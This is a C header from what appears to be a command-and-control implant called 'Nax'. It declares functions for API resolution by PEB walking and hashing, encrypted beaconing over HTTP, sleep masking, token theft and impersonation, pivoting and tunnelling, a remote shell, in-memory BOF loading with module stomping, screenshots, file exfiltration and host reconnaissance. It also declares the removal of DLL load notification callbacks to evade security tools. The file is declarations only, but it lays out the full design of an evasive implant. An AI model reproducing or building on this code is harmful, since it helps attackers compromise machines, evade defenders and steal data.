/* beacon/include/Nax.h
 * Central forward declarations for all internal beacon functions.
 * Include this instead of scattering FUNC prototypes across .c files. */

#pragma once
#include "Macros.h"
#include "Instance.h"
#include "Wire.h"
#include "Helpers.h"
#include "NaxConstants.h"

/* ========= [ Core/Ldr.c - PEB walk, hashing, encoding ] ========= */

FUNC PNAX_PEB_LDR_DATA NaxGetLdr( VOID );
FUNC HANDLE  NaxGetProcessHeap( VOID );
FUNC UINT32  NaxHashStr( const PCHAR str );
FUNC UINT32  NaxHashWStr( const WCHAR* str );
FUNC HMODULE NaxGetModule( UINT32 h );
FUNC PVOID   NaxGetProc( HMODULE base, UINT32 h );
FUNC VOID    NaxHexEncode( const PBYTE src, UINT32 len, PCHAR dst );
FUNC UINT32  NaxUToStr( UINT32 val, PCHAR buf );
FUNC VOID    NaxAsciiToWide( const PCHAR src, PWCHAR dst, UINT32 cap );
FUNC UINT32  NaxBase64Encode( const PBYTE src, UINT32 src_len, PCHAR dst, UINT32 dst_cap );
FUNC UINT32  NaxBase64UrlEncode( const PBYTE src, UINT32 src_len, PCHAR dst, UINT32 dst_cap );
FUNC UINT32  NaxBase64Decode( const PCHAR src, UINT32 src_len, PBYTE dst, UINT32 dst_cap );
FUNC UINT32  NaxHexDecode( const PCHAR src, UINT32 src_len, PBYTE dst, UINT32 dst_cap );
FUNC UINT32  NaxXorMask( PNAX_INSTANCE Nax, const PBYTE src, UINT32 src_len, PBYTE dst, UINT32 dst_cap );
FUNC UINT32  NaxXorUnmask( const PBYTE src, UINT32 src_len, PBYTE dst, UINT32 dst_cap );

/* ========= [ Core/Bootstrap.c ] ========= */

typedef struct _NAX_SYSINFO {
    CHAR   Hostname[64];
    CHAR   Username[256];
    CHAR   IpStr[64];
    CHAR   Domain[256];
    CHAR   Procname[256];
    UINT32 Pid;
    UINT32 Tid;
    UINT32 HnLen;
    UINT32 UnLen;
    UINT32 IpLen;
    UINT32 DmLen;
    UINT32 PnLen;
    UINT32 ImLen;
} NAX_SYSINFO, *PNAX_SYSINFO;

FUNC PNAX_INSTANCE NaxBootstrap( VOID );
FUNC UINT32        NaxEffectiveSleep( PNAX_INSTANCE Nax );
FUNC VOID          NaxGetInternalIp( PNAX_INSTANCE Nax, PCHAR out, UINT32 cap );
FUNC VOID          NaxGetDomain( PNAX_INSTANCE Nax, PCHAR out, UINT32 cap );
FUNC VOID          NaxGatherSysInfo( PNAX_INSTANCE Nax, PNAX_SYSINFO info );

/* ========= [ Core/Config.c ] ========= */

FUNC VOID NaxInitConfig( PNAX_INSTANCE Nax );
FUNC INT  NaxApplyProfile( PNAX_INSTANCE Nax, const PBYTE body, UINT32 body_len );

/* ========= [ Core/PackerProfile.c ] ========= */

FUNC INT NaxDecodeProfile( const PBYTE data, UINT32 data_len, PNAX_INSTANCE Nax );

/* ========= [ Core/Cfg.c - Control Flow Guard ] ========= */

FUNC VOID NaxCfgInit( PNAX_INSTANCE Nax );
FUNC BOOL NaxCfgAddTarget( PNAX_INSTANCE Nax, PVOID ImageBase, PVOID Function );

/* ========= [ Core/Crypto.c ] ========= */

FUNC INT NaxEncrypt( PNAX_INSTANCE Nax, const PBYTE plain, UINT32 plain_len, PBYTE out, UINT32* out_len );
FUNC INT NaxDecrypt( PNAX_INSTANCE Nax, const PBYTE in, UINT32 in_len, PBYTE plain, UINT32* plain_len );

/* ========= [ Core/Packer.c - wire framing ] ========= */

FUNC VOID   NaxW16( PBYTE p, UINT16 v );
FUNC VOID   NaxW32( PBYTE p, UINT32 v );
FUNC UINT16 NaxR16( const PBYTE p );
FUNC UINT32 NaxR32( const PBYTE p );
FUNC INT    NaxFrameEncode( BYTE msg_type, const PBYTE payload, UINT32 payload_len, PBYTE out, UINT32* out_len );
FUNC INT    NaxFrameDecode( const PBYTE frame, UINT32 frame_len, BYTE* msg_type, PBYTE* payload, UINT32* payload_len );
FUNC INT    NaxBuildRegBody( PNAX_INSTANCE Nax, PNAX_SYSINFO info, PBYTE out, UINT32* out_len );
FUNC INT    NaxBuildHeartbeat( PBYTE out, UINT32* out_len );
FUNC INT    NaxDecodeTask( const PBYTE body, UINT32 body_len, NAX_TASK* t );
FUNC INT    NaxBuildResult( UINT32 task_id, BYTE status, const PBYTE data, UINT32 data_len, PBYTE out, UINT32* out_len );

/* ========= [ Commands/Dispatch.c ] ========= */

FUNC VOID NaxDispatchInit( PNAX_INSTANCE Nax );
FUNC INT  NaxDispatch( PNAX_INSTANCE Nax, const NAX_TASK* task, UINT32* result_task_id, BYTE* result_status, PBYTE result_data, UINT32* result_data_len );

/* ========= [ Commands/Sleepmask.c - BeaconGate ] ========= */

FUNC INT  NaxSleepmaskInit( PNAX_INSTANCE Nax );
FUNC INT  NaxSleepmaskWire( PNAX_INSTANCE Nax, PBYTE coff, UINT32 coff_size );
FUNC VOID NaxGateUnwireAll( PNAX_INSTANCE Nax );

/* ========= [ Commands/Token.c ] ========= */

FUNC BOOL NaxTokenResolveUser( PNAX_INSTANCE Nax, HANDLE hToken, PCHAR user, DWORD* userLen, PCHAR domain, DWORD* domainLen, BOOL* elevated );
FUNC BOOL NaxTokenApply( PNAX_INSTANCE Nax, HANDLE hToken );

/* ========= [ Commands/Pivot.c ] ========= */

FUNC UINT32 NaxProcessPivots( PNAX_INSTANCE Nax, PBYTE out, UINT32 out_cap );
FUNC VOID   NaxPostPivotHeaderRead( PNAX_INSTANCE Nax, NAX_PIVOT* p );

/* ========= [ Commands/Jobs.c ] ========= */

FUNC VOID           NaxBofFreeMedia( PNAX_INSTANCE Nax, NAX_BOF_MEDIA* head );
FUNC NAX_BOF_MEDIA* NaxBofReverseMedia( NAX_BOF_MEDIA* head );
FUNC UINT32         NaxProcessJobs( PNAX_INSTANCE Nax, PBYTE out, UINT32 out_cap );
FUNC NAX_JOB*  NaxJobCreate( PNAX_INSTANCE Nax, UINT32 taskId, PBYTE coffBuf, UINT32 coffSize, PBYTE argsBuf, UINT32 argsSize, DWORD timeoutMs );
FUNC INT       NaxJobStart( PNAX_INSTANCE Nax, NAX_JOB* job );
FUNC INT       NaxCmdJobList( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len );
FUNC INT       NaxJobKill( PNAX_INSTANCE Nax, UINT32 taskId );
FUNC INT       NaxCmdJobKill( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
FUNC INT       NaxCmdWatchdogSet( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );

/* ========= [ Commands/Shell.c - remote shell ] ========= */
FUNC VOID    NaxShellDispatch( PNAX_INSTANCE Nax, UINT32 taskId, BYTE cmdId, const PBYTE args, UINT32 argsLen );
FUNC UINT32  NaxProcessShells( PNAX_INSTANCE Nax, PBYTE out, UINT32 out_cap );

/* ========= [ Commands/Tunnel.c ] ========= */

FUNC UINT32 NaxProcessTunnels( PNAX_INSTANCE Nax, PBYTE out, UINT32 outCap );
FUNC VOID   NaxTunnelDispatch( PNAX_INSTANCE Nax, BYTE cmdId, PBYTE args, UINT32 argsLen );

/* ========= [ Bof/Loader.c ] ========= */

FUNC VOID NaxBofStompInit( PNAX_INSTANCE Nax );
FUNC VOID NaxBofFreeResident( PNAX_INSTANCE Nax );

/* ========= [ Transport/Http.c ] ========= */

FUNC BYTE NaxRotateIdx( PNAX_INSTANCE Nax, BYTE idx, BYTE count );
FUNC VOID NaxHttpMain( PNAX_INSTANCE Nax );

/* ========= [ Transport/HttpCodec.c ] ========= */

FUNC UINT32 NaxEncodeData( PNAX_INSTANCE Nax, const NAX_OUTPUT_CFG* cfg, const PBYTE src, UINT32 src_len, PBYTE dst, UINT32 dst_cap );
FUNC UINT32 NaxDecodeData( PNAX_INSTANCE Nax, const NAX_OUTPUT_CFG* cfg, const PBYTE src, UINT32 src_len, PBYTE dst, UINT32 dst_cap );
FUNC UINT32 NaxAppendAsciiW( const PCHAR ascii, PWCHAR out, UINT32 wi, UINT32 cap );
FUNC UINT32 NaxAppendCRLF( PWCHAR out, UINT32 wi, UINT32 cap );
FUNC VOID   NaxBuildRequestHeaders( PNAX_INSTANCE Nax, const PCHAR sid, const PCHAR hdr_base, UINT32 hdr_stride, BYTE hdr_count, const NAX_OUTPUT_CFG* meta_cfg, const PCHAR meta_encoded, UINT32 meta_encoded_len, BOOL is_post, PWCHAR out, UINT32 out_cap );
FUNC BOOL   NaxBuildUrl( PNAX_INSTANCE Nax, const PWCHAR url_w, PCHAR uri, PWCHAR out, UINT32 out_cap );
FUNC VOID   NaxBuildPathWithParams( PWCHAR path_src, PWCHAR path_out, UINT32 path_cap, const NAX_OUTPUT_CFG* meta_cfg, const PCHAR meta_encoded, UINT32 meta_encoded_len, const PCHAR param_base, UINT32 param_stride, BYTE param_count );

/* ========= [ command handlers ] ========= */

FUNC INT NaxCmdWhoami( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len );
FUNC INT NaxCmdSleep( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
FUNC INT NaxCmdCd( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
FUNC INT NaxCmdPwd( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
FUNC INT NaxCmdMkdir( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
FUNC INT NaxCmdRmdir( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
FUNC INT NaxCmdCat( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
FUNC INT NaxCmdLs( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
FUNC INT NaxCmdRm( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
FUNC INT NaxCmdCp( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
FUNC INT NaxCmdMv( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
FUNC INT NaxCmdChunksize( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
FUNC INT NaxCmdBof( PNAX_INSTANCE Nax, UINT32 taskId, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
FUNC INT NaxCmdScreenshot( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len );
FUNC INT NaxCmdDownload( PNAX_INSTANCE Nax, UINT32 taskId, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
FUNC UINT32 NaxProcessDownloads( PNAX_INSTANCE Nax, PBYTE out, UINT32 out_cap );
FUNC INT NaxCmdUpload( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
FUNC INT NaxCmdSaveMemory( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
FUNC NAX_MEMSAVE* NaxMemSaveGet( PNAX_INSTANCE Nax, UINT32 memoryId );
FUNC VOID NaxMemSaveFree( PNAX_INSTANCE Nax, UINT32 memoryId );
FUNC INT NaxCmdBofStomp( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
FUNC INT NaxCmdSleepmaskSet( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
FUNC INT NaxCmdSleepObfConfig( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
FUNC INT NaxCmdPsList( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
FUNC INT NaxCmdPsKill( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
FUNC INT NaxCmdPsRun( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
FUNC INT NaxCmdLink( PNAX_INSTANCE Nax, UINT32 taskId, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
FUNC INT NaxCmdUnlink( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
FUNC INT NaxCmdPivotExec( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
FUNC INT NaxCmdProfile( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
FUNC INT NaxCmdTokenGetUid( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len );
FUNC INT NaxCmdTokenSteal( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
FUNC INT NaxCmdTokenUse( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
FUNC INT NaxCmdTokenList( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len );
FUNC INT NaxCmdTokenRm( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
FUNC INT NaxCmdTokenRevert( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len );
FUNC INT NaxCmdTokenMake( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
FUNC INT NaxCmdTokenPrivs( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len );

/* ========= [ Commands/DllNotify.c ] ========= */

typedef struct _LDR_DLL_NOTIFICATION_ENTRY {
    LIST_ENTRY                      List;
    PLDR_DLL_NOTIFICATION_FUNCTION  Callback;
    PVOID                           Context;
} LDR_DLL_NOTIFICATION_ENTRY, *PLDR_DLL_NOTIFICATION_ENTRY;

FUNC PLIST_ENTRY NaxGetDllNotificationListHead( PNAX_INSTANCE Nax );
FUNC INT  NaxCmdDllNotifyList( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len );
FUNC INT  NaxCmdDllNotifyRemove( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len );
FUNC VOID NaxDllNotifyUnhookAll( PNAX_INSTANCE Nax );
